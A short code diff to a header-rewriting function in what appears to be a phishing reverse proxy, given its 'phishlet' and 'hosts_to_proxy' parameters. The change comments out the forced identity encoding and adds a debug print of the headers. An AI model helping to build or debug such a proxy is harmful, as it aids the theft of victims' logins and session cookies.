@@ -14,10 +14,13 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
     
     # Remove any Accept-Encoding to force identity (no compression) from upstream
     # This avoids sending compressed payloads (e.g., br) that we might not decompress.
-    keys_to_delete = [k for k in list(headers_dict.keys()) if k.lower() == 'accept-encoding']
-    for k in keys_to_delete:
-        headers_dict.pop(k, None)
-    headers_dict['Accept-Encoding'] = 'identity'
+    # keys_to_delete = [k for k in list(headers_dict.keys()) if k.lower() == 'accept-encoding']
+    # for k in keys_to_delete:
+    #     headers_dict.pop(k, None)
+    # check if accept-encoding is in headers_dict if yes then print the headers_dict
+    if 'Accept-Encoding' in headers_dict:
+        print(f"\n  🟢 🟢---- headers_dict: {headers_dict}")
+    # headers_dict['Accept-Encoding'] = 'identity'
 
     # If we have phishlet data and reverse filter is enabled, use proper hostname replacement
     if phishlet_data and any(host.get('reverce_filter', False) for host in phishlet_data.get('hosts_to_proxy', [])):
